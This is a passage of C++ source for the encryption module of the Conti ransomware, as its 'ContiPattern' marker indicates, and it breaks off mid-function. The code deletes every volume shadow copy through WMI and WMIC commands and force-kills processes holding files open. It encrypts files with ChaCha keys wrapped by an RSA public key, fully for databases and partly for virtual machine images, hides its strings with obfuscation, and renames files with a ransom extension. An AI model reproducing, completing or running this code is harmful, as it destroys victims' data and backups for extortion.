#include "cryptor.h"
#include "mrph.h"
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

STATIC CONST DWORD BufferSize = 5242880;
STATIC CONST BYTE g_ContiPattern[16] = { 0xab, 0xff, 0x63, 0xa1, 0x6f, 0xa2 , 0x6e, 0x6e, 0xa3, 0x74, 0x69, 0xbf, 0x4c, 0xdd, 0xff, 0xa1 };
STATIC process_killer::PPID_LIST g_WhitelistPids = NULL;


enum ENCRYPT_MODES {

	FULL_ENCRYPT = 0x24,
	PARTLY_ENCRYPT = 0x25,
	HEADER_ENCRYPT = 0x26

};

VOID
cryptor::SetWhiteListProcess(process_killer::PPID_LIST PidList)
{
	g_WhitelistPids = PidList;
}


VOID CmdExecW(LPCWSTR lpCmdLine)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	WCHAR CmdLine[1024];

	SecureZeroMemory(CmdLine, sizeof(CmdLine));
	SecureZeroMemory(&si, sizeof(si));
	SecureZeroMemory(&pi, sizeof(pi));

	si.wShowWindow = SW_HIDE;
	morphcode(si.wShowWindow);
	si.cb = sizeof(si);
	morphcode(si.cb);
	si.dwFlags = STARTF_USESHOWWINDOW;
	morphcode(si.dwFlags);
	plstrcpyW(CmdLine, lpCmdLine);

	if (pCreateProcessW(NULL, CmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{

		pWaitForSingleObject(pi.hProcess, 10000);
		morphcode(pi.hProcess);
		pCloseHandle(pi.hThread);
		morphcode(pi.hThread);
		pCloseHandle(pi.hProcess);
		morphcode(pi.hProcess);

	}
}

SHORT
cryptor::DeleteShadowCopies(PVOID Reserved)
{

	HRESULT hres;

	// Step 1: --------------------------------------------------
	// Initialize COM. ------------------------------------------

	hres = (HRESULT)pCoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hres))
	{
		return FALSE;                  // Program has failed.
	}

	morphcode(hres);

	// Step 2: --------------------------------------------------
	// Set general COM security levels --------------------------

	hres = (HRESULT)pCoInitializeSecurity(
		NULL,
		-1,                          // COM authentication
		NULL,                        // Authentication services
		NULL,                        // Reserved
		RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
		RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
		NULL,                        // Authentication info
		EOAC_NONE,                   // Additional capabilities 
		NULL                         // Reserved
	);

	morphcode(hres);

	if (FAILED(hres))
	{
		pCoUninitialize();
		return FALSE;                    // Program has failed.
	}

	// Step 3: ---------------------------------------------------
	// Obtain the initial locator to WMI -------------------------

	IWbemLocator* pLoc = NULL;
	hres = (HRESULT)pCoCreateInstance(
		CLSID_WbemLocator,
		0,
		CLSCTX_INPROC_SERVER,
		IID_IWbemLocator, (LPVOID*)&pLoc);

	morphcode(pLoc);

	IWbemContext* pContext = NULL;
	SYSTEM_INFO SysInfo;
	pGetNativeSystemInfo(&SysInfo);

	morphcode(SysInfo.dwActiveProcessorMask);

	if (SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {

		hres = (HRESULT)pCoCreateInstance(CLSID_WbemContext, 0, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&pContext);
		if (FAILED(hres))
		{
			pCoUninitialize();
			return FALSE;
		}

		morphcode(hres);

		BSTR Arch = pSysAllocString(OBFW(L"__ProviderArchitecture"));

		VARIANT vArchitecture;
		pVariantInit(&vArchitecture);
		V_VT(&vArchitecture) = VT_I4;
		V_INT(&vArchitecture) = 64;
		hres = pContext->SetValue(Arch, 0, &vArchitecture);

		morphcode(hres);

		pVariantClear(&vArchitecture);

		if (FAILED(hres))
		{
			pCoUninitialize();
			return FALSE;                 // Program has failed.
		}

	}

	// Step 4: -----------------------------------------------------
	// Connect to WMI through the IWbemLocator::ConnectServer method

	IWbemServices* pSvc = NULL;

	// Connect to the root\cimv2 namespace with
	// the current user and obtain pointer pSvc
	// to make IWbemServices calls.
	BSTR Path = pSysAllocString(OBFW(L"ROOT\\CIMV2"));

	hres = pLoc->ConnectServer(
		Path, // Object path of WMI namespace
		NULL,                    // User name. NULL = current user
		NULL,                    // User password. NULL = current
		0,                       // Locale. NULL indicates current
		NULL,                    // Security flags.
		0,                       // Authority (for example, Kerberos)
		pContext,                       // Context object 
		&pSvc                    // pointer to IWbemServices proxy
	);

	morphcode(pSvc);

	if (FAILED(hres))
	{

		pLoc->Release();
		pCoUninitialize();
		return FALSE;                // Program has failed.
	}

	// Step 5: --------------------------------------------------
	// Set security levels on the proxy -------------------------

	hres = (HRESULT)pCoSetProxyBlanket(
		pSvc,                        // Indicates the proxy to set
		RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
		RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
		NULL,                        // Server principal name 
		RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
		RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
		NULL,                        // client identity
		EOAC_NONE                    // proxy capabilities 
	);

	morphcode(hres);

	if (FAILED(hres))
	{
		pSvc->Release();
		pLoc->Release();
		pCoUninitialize();
		return FALSE;               // Program has failed.
	}

	// Step 6: --------------------------------------------------
	// Use the IWbemServices pointer to make requests of WMI ----

	// For example, get the name of the operating system
	BSTR WqlStr = pSysAllocString(OBFW(L"WQL"));
	BSTR Query = pSysAllocString(OBFW(L"SELECT * FROM Win32_ShadowCopy"));

	IEnumWbemClassObject* pEnumerator = NULL;
	hres = pSvc->ExecQuery(
		WqlStr,
		Query,
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
		NULL,
		&pEnumerator);

	morphcode(hres);

	if (FAILED(hres))
	{
		pSvc->Release();
		pLoc->Release();
		pCoUninitialize();
		return 1;               // Program has failed.
	}

	// Step 7: -------------------------------------------------
	// Get the data from the query in step 6 -------------------

	IWbemClassObject* pclsObj = NULL;
	ULONG uReturn = 0;

	morphcode(pEnumerator);

	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
			&pclsObj, &uReturn);

		morphcode(hr);

		if (0 == uReturn)
		{
			break;
		}

		VARIANT vtProp;

		// Get the value of the Name property
		hr = pclsObj->Get(OBFW(L"ID"), 0, &vtProp, 0, 0);

		morphcode(hr);

		WCHAR CmdLine[1024];
		RtlSecureZeroMemory(CmdLine, sizeof(CmdLine));
		wsprintfW(CmdLine, OBFW(L"cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \"ID='%s'\" delete"), vtProp.bstrVal);

		morphcode();

		LPVOID Old;
		pWow64DisableWow64FsRedirection(&Old);

		morphcode(Old);

		CmdExecW(CmdLine);
		pWow64RevertWow64FsRedirection(Old);

		morphcode(Old);

		pVariantClear(&vtProp);
		pclsObj->Release();
	}

	// Cleanup
	// ========
	if (pContext) {
		pContext->Release();
	}
	pSvc->Release();
	pLoc->Release();
	pEnumerator->Release();
	pCoUninitialize();
	return TRUE;
}

STATIC
BOOL
CheckForDataBases(__in LPCWSTR Filename)
{

	LPCWSTR Extensions[] =
	{

		OBFW(L".4dd"),
		OBFW(L".4dl"),
		OBFW(L".accdb"),
		OBFW(L".accdc"),
		OBFW(L".accde"),
		OBFW(L".accdr"),
		OBFW(L".accdt"),
		OBFW(L".accft"),
		OBFW(L".adb"),
		OBFW(L".ade"),
		OBFW(L".adf"),
		OBFW(L".adp"),
		OBFW(L".arc"),
		OBFW(L".ora"),
		OBFW(L".alf"),
		OBFW(L".ask"),
		OBFW(L".btr"),
		OBFW(L".bdf"),
		OBFW(L".cat"),
		OBFW(L".cdb"),
		OBFW(L".ckp"),
		OBFW(L".cma"),
		OBFW(L".cpd"),
		OBFW(L".dacpac"),
		OBFW(L".dad"),
		OBFW(L".dadiagrams"),
		OBFW(L".daschema"),
		OBFW(L".db"),
		OBFW(L".db-shm"),
		OBFW(L".db-wal"),
		OBFW(L".db3"),
		OBFW(L".dbc"),
		OBFW(L".dbf"),
		OBFW(L".dbs"),
		OBFW(L".dbt"),
		OBFW(L".dbv"),
		OBFW(L".dbx"),
		OBFW(L".dcb"),
		OBFW(L".dct"),
		OBFW(L".dcx"),
		OBFW(L".ddl"),
		OBFW(L".dlis"),
		OBFW(L".dp1"),
		OBFW(L".dqy"),
		OBFW(L".dsk"),
		OBFW(L".dsn"),
		OBFW(L".dtsx"),
		OBFW(L".dxl"),
		OBFW(L".eco"),
		OBFW(L".ecx"),
		OBFW(L".edb"),
		OBFW(L".epim"),
		OBFW(L".exb"),
		OBFW(L".fcd"),
		OBFW(L".fdb"),
		OBFW(L".fic"),
		OBFW(L".fmp"),
		OBFW(L".fmp12"),
		OBFW(L".fmpsl"),
		OBFW(L".fol"),
		OBFW(L".fp3"),
		OBFW(L".fp4"),
		OBFW(L".fp5"),
		OBFW(L".fp7"),
		OBFW(L".fpt"),
		OBFW(L".frm"),
		OBFW(L".gdb"),
		OBFW(L".grdb"),
		OBFW(L".gwi"),
		OBFW(L".hdb"),
		OBFW(L".his"),
		OBFW(L".ib"),
		OBFW(L".idb"),
		OBFW(L".ihx"),
		OBFW(L".itdb"),
		OBFW(L".itw"),
		OBFW(L".jet"),
		OBFW(L".jtx"),
		OBFW(L".kdb"),
		OBFW(L".kexi"),
		OBFW(L".kexic"),
		OBFW(L".kexis"),
		OBFW(L".lgc"),
		OBFW(L".lwx"),
		OBFW(L".maf"),
		OBFW(L".maq"),
		OBFW(L".mar"),
		OBFW(L".mas"),
		OBFW(L".mav"),
		OBFW(L".mdb"),
		OBFW(L".mdf"),
		OBFW(L".mpd"),
		OBFW(L".mrg"),
		OBFW(L".mud"),
		OBFW(L".mwb"),
		OBFW(L".myd"),
		OBFW(L".ndf"),
		OBFW(L".nnt"),
		OBFW(L".nrmlib"),
		OBFW(L".ns2"),
		OBFW(L".ns3"),
		OBFW(L".ns4"),
		OBFW(L".nsf"),
		OBFW(L".nv"),
		OBFW(L".nv2"),
		OBFW(L".nwdb"),
		OBFW(L".nyf"),
		OBFW(L".odb"),
		OBFW(L".oqy"),
		OBFW(L".orx"),
		OBFW(L".owc"),
		OBFW(L".p96"),
		OBFW(L".p97"),
		OBFW(L".pan"),
		OBFW(L".pdb"),
		OBFW(L".pdm"),
		OBFW(L".pnz"),
		OBFW(L".qry"),
		OBFW(L".qvd"),
		OBFW(L".rbf"),
		OBFW(L".rctd"),
		OBFW(L".rod"),
		OBFW(L".rodx"),
		OBFW(L".rpd"),
		OBFW(L".rsd"),
		OBFW(L".sas7bdat"),
		OBFW(L".sbf"),
		OBFW(L".scx"),
		OBFW(L".sdb"),
		OBFW(L".sdc"),
		OBFW(L".sdf"),
		OBFW(L".sis"),
		OBFW(L".spq"),
		OBFW(L".sql"),
		OBFW(L".sqlite"),
		OBFW(L".sqlite3"),
		OBFW(L".sqlitedb"),
		OBFW(L".te"),
		OBFW(L".temx"),
		OBFW(L".tmd"),
		OBFW(L".tps"),
		OBFW(L".trc"),
		OBFW(L".trm"),
		OBFW(L".udb"),
		OBFW(L".udl"),
		OBFW(L".usr"),
		OBFW(L".v12"),
		OBFW(L".vis"),
		OBFW(L".vpd"),
		OBFW(L".vvv"),
		OBFW(L".wdb"),
		OBFW(L".wmdb"),
		OBFW(L".wrk"),
		OBFW(L".xdb"),
		OBFW(L".xld"),
		OBFW(L".xmlff"),
		OBFW(L".abcddb"),
		OBFW(L".abs"),
		OBFW(L".abx"),
		OBFW(L".accdw"),
		OBFW(L".adn"),
		OBFW(L".db2"),
		OBFW(L".fm5"),
		OBFW(L".hjt"),
		OBFW(L".icg"),
		OBFW(L".icr"),
		OBFW(L".kdb"),
		OBFW(L".lut"),
		OBFW(L".maw"),
		OBFW(L".mdn"),
		OBFW(L".mdt")

	};

	INT Count = sizeof(Extensions) / sizeof(LPWSTR);

	for (INT i = 0; i < Count; i++) {

		morphcode((LPVOID)Filename);

		if (pStrStrIW(Filename, Extensions[i])) {
			return TRUE;
		}
	}

	return FALSE;
}

STATIC
BOOL
CheckForVirtualMachines(__in LPCWSTR Filename)
{
	LPCWSTR Extensions[] =
	{

		OBFW(L".vdi"),
		OBFW(L".vhd"),
		OBFW(L".vmdk"),
		OBFW(L".pvm"),
		OBFW(L".vmem"),
		OBFW(L".vmsn"),
		OBFW(L".vmsd"),
		OBFW(L".nvram"),
		OBFW(L".vmx"),
		OBFW(L".raw"),
		OBFW(L".qcow2"),
		OBFW(L".subvol"),
		OBFW(L".bin"),
		OBFW(L".vsv"),
		OBFW(L".avhd"),
		OBFW(L".vmrs"),
		OBFW(L".vhdx"),
		OBFW(L".avdx"),
		OBFW(L".vmcx"),
		OBFW(L".iso")

	};

	INT Count = sizeof(Extensions) / sizeof(LPWSTR);
	for (INT i = 0; i < Count; i++) {

		morphcode((LPVOID)Filename);

		if (pStrStrIW(Filename, Extensions[i])) {
			return TRUE;
		}
	}

	return FALSE;
}

STATIC
BOOL
WriteFullData(
	__in HANDLE hFile,
	__in LPVOID Buffer,
	__in DWORD Size
)
{
	DWORD TotalWritten = 0;
	DWORD BytesWritten = 0;
	DWORD BytesToWrite = Size;
	DWORD Offset = 0;

	while (TotalWritten != Size)
	{

		morphcode(TotalWritten);

		if (!pWriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &BytesWritten, NULL) || !BytesWritten) {

			return FALSE;

		}

		morphcode(BytesWritten);

		Offset += BytesWritten;

		morphcode(Offset);

		TotalWritten += BytesWritten;

		morphcode(BytesToWrite);

		BytesToWrite -= BytesWritten;

	}

	return TRUE;
}

BOOL KillFileOwner(
	__in LPCWSTR PathName)
{
	if (!getapi::IsRestartManagerLoaded()) {

		logs::Write(OBFW(L"Restart manager not loaded."));
		return FALSE;

	}

	BOOL Result = FALSE;
	DWORD dwSession = 0x0;
	DWORD ret = 0;
	WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1];
	RtlSecureZeroMemory(szSessionKey, sizeof(szSessionKey));

	if (pRmStartSession(&dwSession, 0x0, szSessionKey) == ERROR_SUCCESS)
	{

		if (pRmRegisterResources(dwSession, 1, &PathName,
			0, NULL, 0, NULL) == ERROR_SUCCESS)
		{

			DWORD dwReason = 0x0;
			UINT nProcInfoNeeded = 0;
			UINT nProcInfo = 0;
			PRM_PROCESS_INFO ProcessInfo = NULL;
			RtlSecureZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

			ret = (DWORD)pRmGetList(dwSession, &nProcInfoNeeded,
				&nProcInfo, NULL, &dwReason);


			if (ret != ERROR_MORE_DATA || !nProcInfoNeeded) {

				pRmEndSession(dwSession);
				return FALSE;

			}

			ProcessInfo = (PRM_PROCESS_INFO)memory::Alloc(sizeof(RM_PROCESS_INFO) * nProcInfoNeeded);
			if (!ProcessInfo) {

				pRmEndSession(dwSession);
				return FALSE;

			}

			nProcInfo = nProcInfoNeeded;
			ret = (DWORD)pRmGetList(dwSession, &nProcInfoNeeded,
				&nProcInfo, ProcessInfo, &dwReason);

			if (ret != ERROR_SUCCESS || !nProcInfoNeeded) {

				memory::Free(ProcessInfo);
				pRmEndSession(dwSession);
				return FALSE;

			}

			DWORD ProcessId = (DWORD)pGetProcessId(pGetCurrentProcess());

			for (INT i = 0; i < nProcInfo; i++) {

				if (ProcessInfo[i].Process.dwProcessId == ProcessId) {

					memory::Free(ProcessInfo);
					pRmEndSession(dwSession);
					return FALSE;

				}

				process_killer::PPID Pid = NULL;
				TAILQ_FOREACH(Pid, g_WhitelistPids, Entries) {

					if (ProcessInfo[i].Process.dwProcessId == Pid->dwProcessId) {

						memory::Free(ProcessInfo);
						pRmEndSession(dwSession);
						return FALSE;

					}

				}

			}

			Result = pRmShutdown(dwSession, RmForceShutdown, NULL) == ERROR_SUCCESS;
			memory::Free(ProcessInfo);

		}

		pRmEndSession(dwSession);
	}

	return Result;
}


BOOL
cryptor::ChangeFileName(__in LPCWSTR OldName)
{
	LPWSTR NewName = (LPWSTR)memory::Alloc(32727);
	if (!NewName) {
		return FALSE;
	}

	morphcode((LPVOID)NewName);

	plstrcpyW(NewName, OldName);

	morphcode((LPVOID)NewName);

	plstrcatW(NewName, global::GetExtention());

	morphcode((LPVOID)OldName);

	pMoveFileW(OldName, NewName);
	memory::Free(NewName);
	return TRUE;
}

STATIC
BOOL
GenKey(
	__in HCRYPTPROV Provider,
	__in HCRYPTKEY PublicKey,
	__in cryptor::LPFILE_INFO FileInfo
)
{
	DWORD dwDataLen = 40;

	morphcode(FileInfo);

	if (!pCryptGenRandom(Provider, 32, FileInfo->ChachaKey)) {
		return FALSE;
	}

	morphcode(FileInfo->ChachaKey);

	if (!pCryptGenRandom(Provider, 8, FileInfo->ChachaIV)) {
		return FALSE;
	}

	morphcode(FileInfo->ChachaIV);

	RtlSecureZeroMemory(&FileInfo->CryptCtx, sizeof(FileInfo->CryptCtx));
	ECRYPT_keysetup(&FileInfo->CryptCtx, FileInfo->ChachaKey, 256, 64);
	ECRYPT_ivsetup(&FileInfo->CryptCtx, FileInfo->ChachaIV);

	memory::Copy(FileInfo->EncryptedKey, FileInfo->ChachaKey, 32);
	memory::Copy(FileInfo->EncryptedKey + 32, FileInfo->ChachaIV, 8);

	morphcode(FileInfo->EncryptedKey);

	if (!pCryptEncrypt(PublicKey, 0, TRUE, 0, FileInfo->EncryptedKey, &dwDataLen, 524)) {
		return FALSE;
	}

	return TRUE;
}

STATIC
BOOL
CheckContiPattern(
	__in cryptor::LPFILE_INFO FileInfo, 
	__out PBOOL Error
	)
{
	LARGE_INTEGER Pointer;
	Pointer.QuadPart = -16;

	if (!pSetFilePointerEx(FileInfo->FileHandle, Pointer, NULL, FILE_END)) {

		*Error = TRUE;
		return FALSE;

	}

	DWORD TotalRead = 0;
	DWORD BytesRead = 0;
	DWORD Offset = 0;
	DWORD BytesToRead = 16;
	BYTE Buffer[16];
	RtlSecureZeroMemory(Buffer, sizeof(Buffer));

	while (TotalRead != 16) {

		if (!pReadFile(FileInfo->FileHandle, Buffer + Offset, BytesToRead, &BytesRead, NULL) || !BytesRead) {
			
			*Error = TRUE;
			return FALSE;

		}

		TotalRead += BytesRead;
		Offset += BytesRead;
		BytesToRead -= BytesRead;

	}

	*Error = FALSE;
	if (!memcmp(g_ContiPattern, Buffer, 16)) {
		return TRUE;
	}

	return FALSE;
}

STATIC
BOOL
WriteEncryptInfo(
	__in cryptor::LPFILE_INFO FileInfo,
	__in BYTE EncryptMode,
	__in BYTE DataPercent
)
{
	BOOL Success;
	LARGE_INTEGER Offset;
	BYTE Buffer[10];
	Buffer[0] = EncryptMode;
	Buffer[1] = DataPercent;
	memory::Copy(Buffer + 2, &FileInfo->FileSize, 8);

	Offset.QuadPart = 0;
	if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_END)) {

		logs::Write(OBFW(L"Can't write key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
		return FALSE;

	}

	Success = WriteFullData(FileInfo->FileHandle, FileInfo->EncryptedKey, 524);
	if (!Success) {

		logs::Write(OBFW(L"Can't write key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
		return FALSE;

	}

	Success = WriteFullData(FileInfo->FileHandle, Buffer, 10);
	if (!Success) {

		logs::Write(OBFW(L"Can't write key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
		return FALSE;

	}

	pSetEndOfFile(FileInfo->FileHandle);
	Success = (BOOL)pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_BEGIN);
	if (!Success) {
		logs::Write(OBFW(L"Can't write key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
	}

	return Success;
}

STATIC
DWORD
OpenFileEncrypt(__in cryptor::LPFILE_INFO FileInfo)
{
	DWORD Attributes = (DWORD)pGetFileAttributesW(FileInfo->Filename);
	if (Attributes != INVALID_FILE_ATTRIBUTES) {
		if (Attributes & FILE_ATTRIBUTE_READONLY) {
			pSetFileAttributesW(FileInfo->Filename, Attributes ^ FILE_ATTRIBUTE_READONLY);
		}
	}

	FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);

	DWORD LastError = (DWORD)pGetLastError();
	if (FileInfo->FileHandle == INVALID_HANDLE_VALUE)
	{

		if (LastError == ERROR_SHARING_VIOLATION ||
			LastError == ERROR_LOCK_VIOLATION)
		{

			logs::Write(OBFW(L"File %s is already open by another program."), FileInfo->Filename);

			if (KillFileOwner(FileInfo->Filename))
			{

				logs::Write(OBFW(L"KillFileOwner for file %s - success"), FileInfo->Filename);

				FileInfo->FileHandle = pCreateFileW(FileInfo->Filename,
					GENERIC_READ | GENERIC_WRITE,
					0,
					NULL,
					OPEN_EXISTING,
					0,
					NULL);

				if (FileInfo->FileHandle == INVALID_HANDLE_VALUE) {

					logs::Write(OBFW(L"Can't open file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
					return FALSE;

				}

			}
			else {

				logs::Write(OBFW(L"KillFileOwner for file %s - error. GetLastError = %lu."), FileInfo->Filename, pGetLastError());
				return FALSE;

			}

		}
		else {

			logs::Write(OBFW(L"Can't open file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
			return FALSE;

		}

	}

	LARGE_INTEGER FileSize;
	if (!pGetFileSizeEx(FileInfo->FileHandle, &FileSize) || !FileSize.QuadPart) {

		logs::Write(OBFW(L"Can't get file size %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
		CloseHandle(FileInfo->FileHandle);
		return FALSE;

	}

	FileInfo->FileSize = FileSize.QuadPart;
	return TRUE;
}

STATIC
BOOL
EncryptHeader(
	__in cryptor::LPFILE_INFO FileInfo,
	__in LPBYTE Buffer,
	__in HCRYPTPROV CryptoProvider,
	__in HCRYPTKEY PublicKey
)
{
	BOOL Success = FALSE;
	DWORD BytesRead = 0;
	DWORD BytesToRead = 0;
	DWORD BytesToWrite = 0;
	LONGLONG TotalRead = 0;
	LONGLONG BytesToEncrypt;
	LARGE_INTEGER Offset;

	BytesToEncrypt = 1048576;

	while (TotalRead < BytesToEncrypt) {

		morphcode(TotalRead);

		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;

		morphcode(BytesLeft);

		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

		morphcode(BytesToRead);

		Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
		if (!Success || !BytesRead) {
			break;
		}

		morphcode(BytesRead);

		TotalRead += BytesRead;
		BytesToWrite = BytesRead;

		morphcode(TotalRead);

		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

		morphcode(Buffer);

		Offset.QuadPart = -((LONGLONG)BytesRead);
		if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
			break;
		}

		morphcode(Offset.QuadPart);

		Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);
		if (!Success) {
			break;
		}

		morphcode(BytesToWrite);

	}

	return TRUE;
}

STATIC
BOOL
EncryptPartly(
	__in cryptor::LPFILE_INFO FileInfo,
	__in LPBYTE Buffer,
	__in HCRYPTPROV CryptoProvider,
	__in HCRYPTKEY PublicKey,
	__in BYTE DataPercent
)
{
	BOOL Success = FALSE;
	DWORD BytesRead = 0;
	DWORD BytesToRead = 0;
	DWORD BytesToWrite = 0;
	LONGLONG TotalRead = 0;
	LONGLONG BytesToEncrypt;
	LARGE_INTEGER Offset;
	LONGLONG PartSize = 0;
	LONGLONG StepSize = 0;
	INT StepsCount = 0;

	switch (DataPercent) {
	case 10:
		PartSize = (FileInfo->FileSize / 100) * 4;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;
		
	case 15:
		PartSize = (FileInfo->FileSize / 100) * 5;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	case 20:
		PartSize = (FileInfo->FileSize / 100) * 7;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	case 25:
		PartSize = (FileInfo->FileSize / 100) * 9;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	case 30:
		PartSize = (FileInfo->FileSize / 100) * 10;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	case 35:
		PartSize = (FileInfo->FileSize / 100) * 12;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	case 40:
		PartSize = (FileInfo->FileSize / 100) * 14;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	case 50:
		PartSize = (FileInfo->FileSize / 100) * 10;
		morphcode(PartSize);
		StepsCount = 5;
		StepSize = PartSize;
		morphcode(StepSize);
		break;

	case 60:
		PartSize = (FileInfo->FileSize / 100) * 20;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	case 70:
		PartSize = (FileInfo->FileSize / 100) * 23;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	case 80:
		PartSize = (FileInfo->FileSize / 100) * 27;
		morphcode(PartSize);
		StepsCount = 3;
		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;
		morphcode(StepSize);
		break;

	default:
		return FALSE;
	}

	for (INT i = 0; i < StepsCount; i++) {

		TotalRead = 0;
		BytesToEncrypt = PartSize;
		morphcode(BytesToEncrypt);

		if (i != 0) {

			Offset.QuadPart = StepSize;
			if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
				break;
			}

			morphcode(Offset.QuadPart);

		}

		while (TotalRead < BytesToEncrypt) {

			morphcode(TotalRead);

			LONGLONG BytesLeft = BytesToEncrypt - TotalRead;
			morphcode(BytesLeft);
			BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

			morphcode(BytesToRead);

			Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
			if (!Success || !BytesRead) {
				break;
			}

			morphcode(BytesRead);

			TotalRead += BytesRead;
			BytesToWrite = BytesRead;

			morphcode(TotalRead);


			ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

			Offset.QuadPart = -((LONGLONG)BytesRead);
			if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
				break;
			}

			morphcode(Offset.QuadPart);

			Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);
			if (!Success) {
				break;
			}

			morphcode(BytesToWrite);

		}

	}

	return TRUE;
}

STATIC
BOOL
EncryptFull(
	__in cryptor::LPFILE_INFO FileInfo,
	__in LPBYTE Buffer,
	__in HCRYPTPROV CryptoProvider,
	__in HCRYPTKEY PublicKey
)
{
	BOOL Success = FALSE;
	DWORD BytesRead = 0;
	DWORD BytesToRead = 0;
	DWORD BytesToWrite = 0;
	LONGLONG TotalRead = 0;
	LONGLONG BytesToEncrypt;
	LARGE_INTEGER Offset;

	BytesToEncrypt = FileInfo->FileSize;

	while (TotalRead < BytesToEncrypt) {

		morphcode(TotalRead);

		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;
		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;
		morphcode(BytesLeft);

		Success = (BOOL)pReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
		if (!Success || !BytesRead) {
			break;
		}

		TotalRead += BytesRead;
		BytesToWrite = BytesRead;

		morphcode(TotalRead);

		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

		Offset.QuadPart = -((LONGLONG)BytesRead);
		if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
			break;
		}

		morphcode(Offset.QuadPart);

		Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);
		if (!Success) {
			break;
		}

		morphcode(BytesToWrite);

	}

	return TRUE;
}

BOOL
cryptor::Encrypt(
	__in LPFILE_INFO FileInfo,
	__in LPBYTE Buffer,
	__in HCRYPTPROV CryptoProvider,
	__in HCRYPTKEY PublicKey
)
{
	BOOL Result = FALSE;
	DWORD BytesToRead = 0;
	LONGLONG TotalRead = 0;
	LONGLONG TotalWrite = 0;

	if (!GenKey(CryptoProvider, PublicKey, FileInfo)) {

		logs::Write(OBFW(L"Can't gen key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());
		return FALSE;

	}

	if (!OpenFileEncrypt(FileInfo)) {
		return FALSE;
	}

	if (CheckForDataBases(FileInfo->Filename)) {

		if (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, 0)) {
			return FALSE;
		}

		Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey);

	}
	else if (CheckForVirtualMachines(FileInfo->Filename)) {

		if (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, 20)) {
			return FALSE;
		}

		Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, 20);

	}
